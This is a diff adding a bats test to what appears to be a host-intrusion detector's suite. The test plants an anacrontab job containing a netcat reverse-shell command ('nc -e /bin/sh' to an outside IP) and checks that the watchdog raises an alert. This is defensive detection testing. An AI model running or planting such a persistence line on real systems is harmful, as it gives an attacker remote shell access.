@@ -255,3 +255,16 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in anacrontab job: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to sshrc/csh-config/logrotate/systemd-power-hooks/
+    # dhclient-hooks/bash-completion nc reverse-shell variant
+    # INVARIANTs across the brain. Lock the netcat axis on
+    # delayed-root-exec persistence surface too.
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '%s1\t5\tnc.job\tnc -e /bin/sh 1.1.1.1 4444\n' "${BENIGN}" > "${ANAC}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
